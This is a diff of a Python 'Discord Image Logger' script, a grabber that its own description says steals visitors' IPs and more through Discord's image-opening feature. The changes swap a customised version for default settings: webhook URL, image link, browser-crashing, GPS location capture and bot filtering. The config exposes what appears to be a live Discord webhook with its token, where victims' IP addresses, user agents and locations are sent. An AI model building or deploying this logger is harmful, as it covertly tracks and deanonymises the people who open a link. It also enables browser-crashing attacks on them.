@@ -3,31 +3,32 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, webbrowser
+import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "martivi aplikacia discordit ip dasadgena"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "ALUBALIBALI"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
-    "image": "https://media.npr.org/assets/img/2015/09/23/ap_836720500193-d90a20e2b8d735f74d436f36054eb3dc2bd96696.jpg?s=1100&c=85&f=jpeg.jpg",# You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0xAA00ff , # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
-        "message": "!!!!!!!!run pussy!!!!!!!!!! script made by_samxara", # Message to show
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -62,16 +63,16 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
-    if ip.startswith(("")):
+    if ip.startswith(("34", "35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
-        return True
+        return False
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -86,7 +87,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = True, endpoint = "N/A", url = True):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -185,7 +186,7 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler): 
+class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
